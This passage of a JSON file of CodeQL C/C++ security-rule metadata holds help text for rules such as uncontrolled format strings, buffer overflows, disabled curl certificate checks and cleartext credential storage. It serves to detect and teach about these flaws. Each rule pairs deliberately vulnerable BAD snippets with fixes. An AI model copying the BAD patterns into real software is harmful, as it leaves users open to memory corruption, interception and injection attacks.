    "help": "# Cleartext transmission of sensitive information\nSensitive information that is stored unencrypted is accessible to an attacker who gains access to the storage.\n\n\n## Recommendation\nEnsure that sensitive information is always encrypted before being stored to a file or transmitted over the network. It may be wise to encrypt information before it is put into a buffer that may be readable in memory.\n\nIn general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.\n\n\n## Example\nThe following example shows two ways of storing user credentials in a file. In the 'BAD' case, the credentials are simply stored in cleartext. In the 'GOOD' case, the credentials are encrypted before storing them.\n\n\n```c\n#include <sodium.h>\n#include <stdio.h>\n#include <string.h>\n\nvoid writeCredentialsBad(FILE *file, const char *cleartextCredentials) {\n  // BAD: write password to disk in cleartext\n  fputs(cleartextCredentials, file);\n}\n\nint writeCredentialsGood(FILE *file, const char *cleartextCredentials, const unsigned char *key, const unsigned char *nonce) {\n  size_t credentialsLen = strlen(cleartextCredentials);\n  size_t ciphertext_len = crypto_secretbox_MACBYTES + credentialsLen;\n  unsigned char *ciphertext = malloc(ciphertext_len);\n  if (!ciphertext) {\n    logError();\n    return -1;\n  }\n\n  // encrypt the password first\n  if (crypto_secretbox_easy(ciphertext, (const unsigned char *)cleartextCredentials, credentialsLen, nonce, key) != 0) {\n    free(ciphertext);\n    logError();\n    return -1;\n  }\n\n  // GOOD: write encrypted password to disk\n  fwrite(ciphertext, 1, ciphertext_len, file);\n\n  free(ciphertext);\n  return 0;\n}\n\n```\nNote that for the 'GOOD' example to work we need to link against an encryption library (in this case libsodium), initialize it with a call to `sodium_init`, and create the key and nonce with `crypto_secretbox_keygen` and `randombytes_buf` respectively. We also need to store those details securely so they can be used for decryption.\n\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n"
  },
  "cpp/tainted-format-string": {
    "name": "Uncontrolled format string",
    "description": "Using externally-controlled format strings in printf-style functions can lead to buffer overflows or data representation problems.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 9.3,
    "precision": "high",
    "id": "cpp/tainted-format-string",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-134"
    ],
    "filename": "754bffac-UncontrolledFormatString",
    "language": "cpp",
    "help": "# Uncontrolled format string\nThe program uses input from the user as a format string for `printf` style functions. This can lead to buffer overflows or data representation problems. An attacker can exploit this weakness to crash the program, disclose information or even execute arbitrary code.\n\nThe results of this rule do not include inputs from the user that are transferred through global variables. Those can be found in the related rule \"Uncontrolled format string (through global variable)\".\n\n\n## Recommendation\nUse constant expressions as the format strings. If you need to print a value from the user, use `printf(\"%s\", value_from_user)`.\n\n\n## Example\n\n```c\n#include <stdio.h>\n\nvoid printWrapper(char *str) {\n\tprintf(str);\n}\n\nint main(int argc, char **argv) {\n\t// This should be avoided\n\tprintf(argv[1]);\n\n\t// This should be avoided too, because it has the same effect\n\tprintWrapper(argv[1]);\n\n\t// This is fine\n\tprintf(\"%s\", argv[1]);\n}\n```\n\n## References\n* CERT C Coding Standard: [FIO30-C. Exclude user input from format strings](https://www.securecoding.cert.org/confluence/display/c/FIO30-C.+Exclude+user+input+from+format+strings).\n* Common Weakness Enumeration: [CWE-134](https://cwe.mitre.org/data/definitions/134.html).\n"
  },
  "cpp/errors-when-using-variable-declaration-inside-loop": {
    "name": "Errors When Using Variable Declaration Inside Loop",
    "description": "Using variables with the same name is dangerous. However, such a situation inside the while loop can create an infinite loop exhausting resources. Requires the attention of developers.",
    "kind": "problem",
    "id": "cpp/errors-when-using-variable-declaration-inside-loop",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-1126"
    ],
    "filename": "22223690-DeclarationOfVariableWithUnnecessarilyWideScope",
    "language": "cpp",
    "help": "# Errors When Using Variable Declaration Inside Loop\nUsing variables with the same name is dangerous. However, such a situation inside the while loop can create an infinite loop exhausting resources. Requires the attention of developers.\n\n\n## Recommendation\nWe recommend not to use local variables inside a loop if their names are the same as the variables in the condition of this loop.\n\n\n## Example\nThe following example demonstrates an erroneous and corrected use of a local variable within a loop.\n\n\n```c\nwhile(intIndex > 2)\n{\n  ...\n  intIndex--;\n  ...\n} // GOOD: correct cycle\n...\nwhile(intIndex > 2)\n{\n  ...\n  int intIndex;\n  intIndex--;\n  ...\n} // BAD: the variable used in the condition does not change.\n\n```\n\n## References\n* CERT C Coding Standard: [DCL01-C. Do not reuse variable names in subscopes](https://wiki.sei.cmu.edu/confluence/display/c/DCL01-C.+Do+not+reuse+variable+names+in+subscopes).\n* Common Weakness Enumeration: [CWE-1126](https://cwe.mitre.org/data/definitions/1126.html).\n"
  },
  "cpp/operator-find-incorrectly-used-switch": {
    "name": "Incorrect switch statement",
    "description": "--Finding places the dangerous use of a switch. --For example, when the range of values for a condition does not cover all of the selection values..",
    "kind": "problem",
    "id": "cpp/operator-find-incorrectly-used-switch",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-561",
      "external/cwe/cwe-691",
      "external/cwe/cwe-478"
    ],
    "filename": "467e0973-FindIncorrectlyUsedSwitch",
    "language": "cpp",
    "help": "# Incorrect switch statement\nA mismatch between conditionals and `switch` cases can lead to control-flow violations (CWE-691) where the developer either does not handle all combinations of conditions or unintentionally created dead code (CWE-561).\n\n\n## Example\nThe following example demonstrates fallacious and fixed ways of using a `switch` statement.\n\n\n```c\n...\n  int i1;\n  char c1;\n...\n  if((c1<50)&&(c>10))\n  switch(c1){\n    case 300: // BAD: the code will not be executed\n...  \n  if((i1<5)&&(i1>0))\n  switch(i1){ // BAD\n    case 21: // BAD: the code will not be executed\n...\n  switch(c1){\n...\n  dafault: // BAD: maybe it will be right `default`\n...\n  }\n\n...\n  switch(c1){ \n      i1=c1*2; // BAD: the code will not be executed\n    case 12:\n...\n  switch(c1){ // GOOD\n    case 12:\n      break;\n    case 10:\n      break;\n    case 9:\n      break;\n    default:\n      break;\n  }\n...\n\n```\n\n## References\n* CERT C Coding Standard: [MSC12-C. Detect and remove code that has no effect or is never executed](https://wiki.sei.cmu.edu/confluence/display/c/MSC12-C.+Detect+and+remove+code+that+has+no+effect+or+is+never+executed).\n* Common Weakness Enumeration: [CWE-561](https://cwe.mitre.org/data/definitions/561.html).\n* Common Weakness Enumeration: [CWE-691](https://cwe.mitre.org/data/definitions/691.html).\n* Common Weakness Enumeration: [CWE-478](https://cwe.mitre.org/data/definitions/478.html).\n"
  },
  "cpp/certificate-not-checked": {
    "name": "Certificate not checked",
    "description": "Always check the result of certificate verification after fetching an SSL certificate.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "cpp/certificate-not-checked",
    "tags": [
      "security",
      "external/cwe/cwe-295"
    ],
    "filename": "126b18b9-SSLResultNotChecked",
    "language": "cpp",
    "help": "# Certificate not checked\nAfter fetching an SSL certificate, always check the result of certificate verification.\n\n\n## Recommendation\nAlways check the result of SSL certificate verification. A certificate that has been revoked may indicate that data is coming from an attacker, whereas a certificate that has expired or was self-signed may indicate an increased likelihood that the data is malicious.\n\n\n## Example\nIn this example, the `SSL_get_peer_certificate` function is used to get the certificate of a peer. However it is unsafe to use that information without checking if the certificate is valid.\n\n\n```cpp\n// ...\n\nX509 *cert = SSL_get_peer_certificate(ssl); // BAD (SSL_get_verify_result is never called)\n\n// ...\n```\nIn the corrected example, we use `SSL_get_verify_result` to check that certificate verification was successful.\n\n\n```cpp\n// ...\n\nX509 *cert = SSL_get_peer_certificate(ssl); // GOOD\nif (cert)\n{\n\tresult = SSL_get_verify_result(ssl);\n\tif (result == X509_V_OK)\n\t{\n\t\t// ...\n```\n\n## References\n* Common Weakness Enumeration: [CWE-295](https://cwe.mitre.org/data/definitions/295.html).\n"
  },
  "cpp/overflow-buffer": {
    "name": "Call to memory access function may overflow buffer",
    "description": "Incorrect use of a function that accesses a memory buffer may read or write data past the end of that buffer.",
    "kind": "problem",
    "id": "cpp/overflow-buffer",
    "problem.severity": "recommendation",
    "security-severity": 9.3,
    "tags": [
      "security",
      "external/cwe/cwe-119",
      "external/cwe/cwe-121",
      "external/cwe/cwe-122",
      "external/cwe/cwe-126"
    ],
    "filename": "e51e4b29-OverflowBuffer",
    "language": "cpp",
    "help": "# Call to memory access function may overflow buffer\nThe software uses a function to access a memory buffer in a way that may read or write data past the end of that buffer. This may result in software instability, improper access to or corruption of sensitive information, or code execution by an attacker.\n\n\n## Recommendation\nWhen accessing buffers with functions such as `memcpy`, `memset` or `strncpy`, ensure that the size value for the operation is no greater than the amount of space available in the destination buffer. Failure to do this may permit a buffer overwrite to occur. Also ensure that the size value is no greater than the amount of data in the source buffer, to prevent a buffer overread from occurring.\n\n\n## Example\nIn the following example, `memcpy` is used to fill a buffer with data from a string.\n\n\n```c\nconst char *message = \"Hello\";\nchar password[32];\nchar buffer[256];\n\nmemcpy(buffer, message, 256);\n\n```\nAlthough the size of the operation matches the destination buffer, the source is only 6 bytes long so an overread will occur. This could copy sensitive data from nearby areas of memory (such as the local variable `password` in this example) into the buffer as well, potentially making it visible to an attacker.\n\nTo fix this issue, reduce the size of the `memcpy` to the smaller of the source and destination buffers, `min(256, strlen(message) + 1)`. Alternatively in this case it would be more appropriate to use the `strncpy` function rather than `memcpy`.\n\n\n## References\n* Common Weakness Enumeration: [CWE-119](https://cwe.mitre.org/data/definitions/119.html).\n* Common Weakness Enumeration: [CWE-121](https://cwe.mitre.org/data/definitions/121.html).\n* Common Weakness Enumeration: [CWE-122](https://cwe.mitre.org/data/definitions/122.html).\n* Common Weakness Enumeration: [CWE-126](https://cwe.mitre.org/data/definitions/126.html).\n"
  },
  "cpp/buffer-access-with-incorrect-length-value": {
    "name": "Buffer access with incorrect length value",
    "description": "Incorrect use of the length argument in some functions will result in out-of-memory accesses.",
    "kind": "problem",
    "id": "cpp/buffer-access-with-incorrect-length-value",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-805"
    ],
    "filename": "d5fad167-BufferAccessWithIncorrectLengthValue",
    "language": "cpp",
    "help": "# Buffer access with incorrect length value\nUsing a size argument that is larger than the buffer size will result in an out-of-bounds memory access and possibly overflow. You need to limit the value of the length argument.\n\n\n## Example\nThe following example shows the use of a function with and without an error in the size argument.\n\n\n```cpp\n\n...\nchar buf[256];\nX509_NAME_oneline(X509_get_subject_name(peer),buf,sizeof(buf)); // GOOD\n...\nchar buf[256];\nX509_NAME_oneline(X509_get_subject_name(peer),buf,1024); // BAD\n...\n\n```\n\n## References\n* CERT Coding Standard: [ARR38-C. Guarantee that library functions do not form invalid pointers - SEI CERT C Coding Standard - Confluence](https://wiki.sei.cmu.edu/confluence/display/c/ARR38-C.+Guarantee+that+library+functions+do+not+form+invalid+pointers).\n* Common Weakness Enumeration: [CWE-805](https://cwe.mitre.org/data/definitions/805.html).\n"
  },
  "cpp/multiplication-overflow-in-alloc": {
    "name": "Multiplication result may overflow and be used in allocation",
    "description": "Using a multiplication result that may overflow in the size of an allocation may lead to buffer overflows when the allocated memory is used.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "precision": "low",
    "tags": [
      "security",
      "correctness",
      "experimental",
      "external/cwe/cwe-190",
      "external/cwe/cwe-128"
    ],
    "id": "cpp/multiplication-overflow-in-alloc",
    "filename": "97b3e969-AllocMultiplicationOverflow",
    "language": "cpp",
    "help": "# Multiplication result may overflow and be used in allocation\nThe result of a multiplication is used in the size of an allocation. If the multiplication can be made to overflow, a much smaller amount of memory may be allocated than the rest of the code expects. This may lead to overflowing writes when the buffer is accessed later.\n\n\n## Recommendation\nTo fix this issue, ensure that the arithmetic used in the size of an allocation cannot overflow before memory is allocated.\n\n\n## Example\nIn the following example, an array of size `width * height` is allocated and stored as `pixels`. If `width` and `height` are set such that the multiplication overflows and wraps to a small value (say, 4) then the initialization code that follows the allocation will write beyond the end of the array.\n\n\n```cpp\n\nimage::image(int width, int height)\n{\n\tint x, y;\n\n\t// allocate width * height pixels\n\tpixels = new uint32_t[width * height];\n\n\t// fill width * height pixels\n\tfor (y = 0; y < height; y++)\n\t{\n\t\tfor (x = 0; x < width; x++)\n\t\t{\n\t\t\tpixels[(y * width) + height] = 0;\n\t\t}\n\t}\n\n\t// ...\n}\n\n```\n\n## References\n* Cplusplus.com: [Integer overflow](http://www.cplusplus.com/articles/DE18T05o/).\n* Common Weakness Enumeration: [CWE-190](https://cwe.mitre.org/data/definitions/190.html).\n* Common Weakness Enumeration: [CWE-128](https://cwe.mitre.org/data/definitions/128.html).\n"
  },
  "cpp/late-check-of-function-argument": {
    "name": "Late Check Of Function Argument",
    "description": "--Checking the function argument after calling the function itself. --This situation looks suspicious and requires the attention of the developer. --It may be necessary to add validation before calling the function.",
    "kind": "problem",
    "id": "cpp/late-check-of-function-argument",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-20"
    ],
    "filename": "b78cd8be-LateCheckOfFunctionArgument",
    "language": "cpp",
    "help": "# Late Check Of Function Argument\nChecking the function argument after calling the function itself. This situation looks suspicious and requires the attention of the developer. It may be necessary to add validation before calling the function\n\n\n## Recommendation\nWe recommend checking before calling the function.\n\n\n## Example\nThe following example demonstrates an erroneous and fixed use of function argument validation.\n\n\n```c\nif(len<0) return 1;\nmemset(dest, source, len); // GOOD: variable `len` checked before call\n\n...\n\nmemset(dest, source, len); // BAD: variable `len` checked after call\nif(len<0) return 1;\n\n```\n\n## References\n* CWE Common Weakness Enumeration: [ CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "cpp/curl-disabled-ssl": {
    "name": "Disabled certifcate verification",
    "description": "Disabling SSL certificate verification of host or peer could expose the communication to man-in-the-middle(MITM) attacks.",
    "kind": "problem",
    "problem.severity": "warning",
    "id": "cpp/curl-disabled-ssl",
    "tags": [
      "security",
      "external/cwe/cwe-295"
    ],
    "filename": "04832f4f-CurlSSL",
    "language": "cpp",
    "help": "# Disabled certifcate verification\nDisabling verification of the SSL certificate allows man-in-the-middle attacks. A SSL connection is vulnerable to man-in-the-middle attacks if the certification is not checked properly. If the peer or the host's certificate verification is not verified, the underlying SSL communication is insecure.\n\n\n## Recommendation\nIt is recommended that all communications be done post verification of the host as well as the peer.\n\n\n## Example\nThe following snippet disables certification verification by setting the value of ` CURLOPT_SSL_VERIFYHOST` and `CURLOPT_SSL_VERIFYHOST` to `0`:\n\n\n```cpp\nstring host = \"codeql.com\"\nvoid bad(void) {\n\tstd::unique_ptr<CURL, void(*)(CURL*)> curl =\n\t\tstd::unique_ptr<CURL, void(*)(CURL*)>(curl_easy_init(), curl_easy_cleanup);\n\tcurl_easy_setopt(curl.get(), CURLOPT_SSL_VERIFYPEER, 0);\n\tcurl_easy_setopt(curl.get(), CURLOPT_SSL_VERIFYHOST, 0); \n  \tcurl_easy_setopt(curl.get(), CURLOPT_URL, host.c_str());\n  \tcurl_easy_perform(curl.get());\n}\n```\nThis is bad as the certificates are not verified any more. This can be easily fixed by setting the values of the options to `2`.\n\n\n```cpp\nstring host = \"codeql.com\"\nvoid good(void) {\n\tstd::unique_ptr<CURL, void(*)(CURL*)> curl =\n\t\tstd::unique_ptr<CURL, void(*)(CURL*)>(curl_easy_init(), curl_easy_cleanup);\n\tcurl_easy_setopt(curl.get(), CURLOPT_SSL_VERIFYPEER, 2);\n\tcurl_easy_setopt(curl.get(), CURLOPT_SSL_VERIFYHOST, 2); \n  \tcurl_easy_setopt(curl.get(), CURLOPT_URL, host.c_str());\n  \tcurl_easy_perform(curl.get());\n}\n```\n\n## References\n* Curl Documentation:[ CURLOPT_SSL_VERIFYHOST](https://curl.se/libcurl/c/CURLOPT_SSL_VERIFYHOST.html)\n* Curl Documentation:[ CURLOPT_SSL_VERIFYPEER](https://curl.se/libcurl/c/CURLOPT_SSL_VERIFYPEER.html)\n* Related CVE: [ CVE-2022-33684](https://github.com/advisories/GHSA-5r3h-c3r7-9w4h)\n* Related security advisory: [ openframeworks/openframeworks ](https://huntr.com/bounties/42325662-6329-4e04-875a-49e2f5d69f78)\n* Common Weakness Enumeration: [CWE-295](https://cwe.mitre.org/data/definitions/295.html).\n"
  },
  "cpp/operator-precedence-logic-error-when-use-bitwise-logical-operations": {
    "name": "Operator Precedence Logic Error When Use Bitwise Or Logical Operations",
    "description": "--Finding places to use bit and logical operations, without explicit priority allocation. --For example, `a || b ^ c` and `(a || b) ^ c` give different results when `b` is zero.",
    "kind": "problem",
    "id": "cpp/operator-precedence-logic-error-when-use-bitwise-logical-operations",
    "problem.severity": "recommendation",
    "precision": "medium",
    "tags": [
      "maintainability",
      "readability",
      "experimental",
      "external/cwe/cwe-783",
      "external/cwe/cwe-480"
    ],
    "filename": "134c1c3a-OperatorPrecedenceLogicErrorWhenUseBitwiseOrLogicalOperations",
    "language": "cpp",
    "help": "# Operator Precedence Logic Error When Use Bitwise Or Logical Operations\nFind places of confusing use of logical and bitwise operations.\n\n\n## Recommendation\nWe recommend using parentheses to explicitly emphasize priority.\n\n\n## Example\nThe following example demonstrates fallacious and fixed methods of using logical and bitwise operations.\n\n\n```c\nbool a=1,b=0,c=1,res;\n...\nres = a||b^c; // BAD: possible priority error `res==1`\n...\nres = a||(b^c); // GOOD: `res==1`\n... \nres = (a||b)^c; // GOOD: `res==0`\n\n```\n\n## References\n* CERT C Coding Standard: [EXP00-C. Use parentheses for precedence of operation](https://wiki.sei.cmu.edu/confluence/display/c/EXP00-C.+Use+parentheses+for+precedence+of+operation).\n* Common Weakness Enumeration: [CWE-783](https://cwe.mitre.org/data/definitions/783.html).\n* Common Weakness Enumeration: [CWE-480](https://cwe.mitre.org/data/definitions/480.html).\n"
  },
  "cpp/constant-array-overflow": {
    "name": "Constant array overflow",
    "description": "Dereferencing a pointer that points past a statically-sized array is undefined behavior and may lead to security vulnerabilities",
    "kind": "path-problem",
    "problem.severity": "error",
    "id": "cpp/constant-array-overflow",
    "tags": [
      "reliability",
      "security",
      "experimental"
    ],
    "filename": "49e88329-ConstantSizeArrayOffByOne",
    "language": "cpp",
    "help": "# Constant array overflow\nThe program performs an out-of-bounds read or write operation. In addition to causing program instability, techniques exist which may allow an attacker to use this vulnerability to execute arbitrary code.\n\n\n## Recommendation\nEnsure that pointer dereferences are properly guarded to ensure that they cannot be used to read or write past the end of the allocation.\n\n\n## Example\nThe first example uses a for loop which is improperly bounded by a non-strict less-than operation and will write one position past the end of the array. The second example bounds the for loop properly with a strict less-than operation.\n\n\n```cpp\n#define MAX_SIZE 1024\n\nstruct FixedArray {\n  int buf[MAX_SIZE];\n};\n\nint main(){\n  FixedArray arr;\n\n  for(int i = 0; i <= MAX_SIZE; i++) {\n    arr.buf[i] = 0; // BAD\n  }\n\n  for(int i = 0; i < MAX_SIZE; i++) {\n    arr.buf[i] = 0; // GOOD\n  }\n}\n```\n\n## References\n* CERT C Coding Standard: [ARR30-C. Do not form or use out-of-bounds pointers or array subscripts](https://wiki.sei.cmu.edu/confluence/display/c/ARR30-C.+Do+not+form+or+use+out-of-bounds+pointers+or+array+subscripts).\n* OWASP: [Buffer Overflow](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow).\n"
  },
  "cpp/non-https-url": {
    "name": "Failure to use HTTPS URLs",
    "description": "Non-HTTPS connections can be intercepted by third parties.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 8.1,
    "precision": "high",
    "id": "cpp/non-https-url",
    "tags": [
      "security",
      "external/cwe/cwe-319",
      "external/cwe/cwe-345"
    ],
    "filename": "2a6fe0d8-UseOfHttp",
    "language": "cpp",
    "help": "# Failure to use HTTPS URLs\nConstructing URLs with the HTTP protocol can lead to unsecured connections.\n\n\n## Recommendation\nWhen you construct a URL, ensure that you use an HTTPS URL rather than an HTTP URL. Then, any connections that are made using that URL are secure SSL connections.\n\n\n## Example\nThe following example shows two ways of opening a connection using a URL. When the connection is opened using an HTTP URL rather than an HTTPS URL, the connection is unsecured. When the connection is opened using an HTTPS URL, the connection is a secure SSL connection.\n\n\n```cpp\n\nvoid openUrl(char *url)\n{\n\t// ...\n}\n\nopenUrl(\"http://example.com\"); // BAD\n\nopenUrl(\"https://example.com\"); // GOOD: Opening a connection to a URL using HTTPS enforces SSL.\n\n```\n\n## References\n* OWASP: [Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html).\n* OWASP Top 10: [A08:2021 - Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/).\n* Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).\n* Common Weakness Enumeration: [CWE-345](https://cwe.mitre.org/data/definitions/345.html).\n"
  },
  "cpp/uncontrolled-allocation-size": {
    "name": "Uncontrolled allocation size",
    "description": "Allocating memory with a size controlled by an external user can result in arbitrary amounts of memory being allocated.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.1,
    "precision": "medium",
    "id": "cpp/uncontrolled-allocation-size",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-190",
      "external/cwe/cwe-789"
    ],
    "filename": "d81e4b10-TaintedAllocationSize",
    "language": "cpp",
    "help": "# Uncontrolled allocation size\nThis code allocates memory using a size value based on user input, with no apparent bound on its magnitude being established. This allows for arbitrary amounts of memory to be allocated.\n\nIf the allocation size is calculated by multiplying user input by a `sizeof` expression, the multiplication can overflow. When an integer multiplication overflows in C, the result wraps around and can be much smaller than intended. A later attempt to write data into the allocated memory can then be out of bounds.\n\n\n## Recommendation\nGuard all integer parameters that come from an external user. Implement a guard with the expected range for the parameter and make sure that the input value meets both the minimum and maximum requirements for this range. If the input value fails this guard then reject the request before proceeding further. If the input value passes the guard then subsequent calculations should not overflow.\n\n\n## Example\n\n```c\nint factor = atoi(getenv(\"BRANCHING_FACTOR\"));\n\n// BAD: This can allocate too little memory if factor is very large due to overflow.\nchar **root_node = (char **) malloc(factor * sizeof(char *));\n\n// GOOD: Prevent overflow and unbounded allocation size by checking the input.\nif (factor > 0 && factor <= 1000) {\n    char **root_node = (char **) malloc(factor * sizeof(char *));\n}\n\n```\nThis code shows one way to guard that an input value is within the expected range. If `factor` fails the guard, then an error is returned, and the value is not used as an argument to the subsequent call to `malloc`. Without this guard, the allocated buffer might be too small to hold the data intended for it.\n\n\n## References\n* The CERT Oracle Secure Coding Standard for C: [INT04-C. Enforce limits on integer values originating from tainted sources](https://www.securecoding.cert.org/confluence/display/c/INT04-C.+Enforce+limits+on+integer+values+originating+from+tainted+sources).\n* Common Weakness Enumeration: [CWE-190](https://cwe.mitre.org/data/definitions/190.html).\n* Common Weakness Enumeration: [CWE-789](https://cwe.mitre.org/data/definitions/789.html).\n"
  },
  "cpp/cleartext-storage-file": {
    "name": "Cleartext storage of sensitive information in file",
    "description": "Storing sensitive information in cleartext can expose it to an attacker.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "cpp/cleartext-storage-file",
    "tags": [
      "security",
      "external/cwe/cwe-260",
      "external/cwe/cwe-313"
    ],
    "filename": "8538808f-CleartextFileWrite",
    "language": "cpp",
    "help": "# Cleartext storage of sensitive information in file\nSensitive information that is stored unencrypted is accessible to an attacker who gains access to the storage.\n\n\n## Recommendation\nEnsure that sensitive information is always encrypted before being stored to a file or transmitted over the network. It may be wise to encrypt information before it is put into a buffer that may be readable in memory.\n\nIn general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.\n\n\n## Example\nThe following example shows two ways of storing user credentials in a file. In the 'BAD' case, the credentials are simply stored in cleartext. In the 'GOOD' case, the credentials are encrypted before storing them.\n\n\n```c\n#include <sodium.h>\n#include <stdio.h>\n#include <string.h>\n\nvoid writeCredentialsBad(FILE *file, const char *cleartextCredentials) {\n  // BAD: write password to disk in cleartext\n  fputs(cleartextCredentials, file);\n}\n\nint writeCredentialsGood(FILE *file, const char *cleartextCredentials, const unsigned char *key, const unsigned char *nonce) {\n  size_t credentialsLen = strlen(cleartextCredentials);\n  size_t ciphertext_len = crypto_secretbox_MACBYTES + credentialsLen;\n  unsigned char *ciphertext = malloc(ciphertext_len);\n  if (!ciphertext) {\n    logError();\n    return -1;\n  }\n\n  // encrypt the password first\n  if (crypto_secretbox_easy(ciphertext, (const unsigned char *)cleartextCredentials, credentialsLen, nonce, key) != 0) {\n    free(ciphertext);\n    logError();\n    return -1;\n  }\n\n  // GOOD: write encrypted password to disk\n  fwrite(ciphertext, 1, ciphertext_len, file);\n\n  free(ciphertext);\n  return 0;\n}\n\n```\nNote that for the 'GOOD' example to work we need to link against an encryption library (in this case libsodium), initialize it with a call to `sodium_init`, and create the key and nonce with `crypto_secretbox_keygen` and `randombytes_buf` respectively. We also need to store those details securely so they can be used for decryption.\n\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n"
  },
  "cpp/untrusted-data-to-external-api-ir": {
    "name": "Untrusted data passed to external API",
    "description": "Data provided remotely is used in this external API without sanitization, which could be a security risk.",
    "id": "cpp/untrusted-data-to-external-api-ir",
    "kind": "path-problem",
    "precision": "low",
    "problem.severity": "error",
    "security-severity": 7.8,
    "tags": [
      "security external/cwe/cwe-20"
    ],
    "filename": "ce4f8673-IRUntrustedDataToExternalAPI",
    "language": "cpp",
    "help": "# Untrusted data passed to external API\nUsing unsanitized untrusted data in an external API can cause a variety of security issues. This query reports external APIs that use untrusted data. The results are not filtered, so you can audit all examples. The query provides data for security reviews of the application and you can also use it to identify external APIs that should be modeled as either taint steps, or sinks for specific problems.\n\nAn external API is defined as a call to a function that is not defined in the source code, and is not modeled as a taint step in the default taint library. External APIs may be from the C++ standard library, third-party dependencies or from internal dependencies. The query reports uses of untrusted data in either the qualifier or as one of the arguments of external APIs.\n\n\n## Recommendation\nFor each result:\n\n* If the result highlights a known sink, confirm that the result is reported by the relevant query, or that the result is a false positive because this data is sanitized.\n* If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query, and confirm that the result is either found, or is safe due to appropriate sanitization.\n* If the result represents a call to an external API that transfers taint, add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.\nOtherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPIFunction` class to exclude known safe external APIs from future analysis.\n\n\n## Example\nIn this first example, input is read from `fgets` and then ultimately used in a call to the `fputs` external API:\n\n\n```cpp\n#include <cstdio>\n\nvoid do_get(FILE* request, FILE* response) {\n  char page[1024];\n  fgets(page, 1024, request);\n\n  char buffer[1024];\n  strcat(buffer, \"The page \\\"\");\n  strcat(buffer, page);\n  strcat(buffer, \"\\\" was not found.\");\n\n  fputs(buffer, response);\n}\n```\nThis is an XSS sink. The XSS query should therefore be reviewed to confirm that this sink is appropriately modeled, and if it is, to confirm that the query reports this particular result, or that the result is a false positive due to some existing sanitization.\n\nIn this second example, again a request parameter is read from `fgets`.\n\n\n```cpp\n#include <cstdio>\n\nvoid do_get(FILE* request, FILE* response) {\n  char user_id[1024];\n  fgets(user_id, 1024, request);\n\n  char buffer[1024];\n  strcat(buffer, \"SELECT * FROM user WHERE user_id='\");\n  strcat(buffer, user_id);\n  strcat(buffer, \"'\");\n\n  // ...\n}\n```\nIf the query reported the call to `strcat` on line 9, this would suggest that this external API is not currently modeled as a taint step in the taint tracking library. The next step would be to model this as a taint step, then re-run the query to determine what additional results might be found. In this example, it seems likely that `buffer` will be executed as an SQL query, potentially leading to an SQL injection vulnerability.\n\nNote that both examples are correctly handled by the standard taint tracking library and XSS query.\n\n\n## References\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "cpp/dangerous-use-of-transformation-after-operation": {
    "name": "Dangerous use of transformation after operation.",
    "description": "By using the transformation after the operation, you are doing a pointless and dangerous action.",
    "kind": "problem",
    "id": "cpp/dangerous-use-of-transformation-after-operation",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-190"
    ],
    "filename": "97b3e969-DangerousUseOfTransformationAfterOperation",
    "language": "cpp",
